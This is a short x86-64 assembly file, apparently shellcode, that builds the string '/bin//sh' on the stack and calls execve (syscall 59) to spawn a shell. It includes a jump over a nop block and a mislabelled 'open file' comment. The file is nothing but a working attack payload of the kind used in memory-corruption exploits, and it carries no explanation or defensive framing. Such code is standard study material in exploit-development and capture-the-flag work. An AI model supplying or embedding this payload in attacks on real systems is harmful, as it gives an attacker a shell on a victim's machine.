global _start

section .text
_start:

	sub rsp, 0xff
	
	; open file
	xor rax, rax
	jmp second

skip1:
	nop
	nop
	nop
	nop
	nop
	nop
	nop
	nop

second:
	push rax
	xor rsi, rsi
	xor rdx, rdx
	mov rbx, '/bin//sh'
	push rbx
	push rsp
	pop rdi
	mov al, 59
	syscall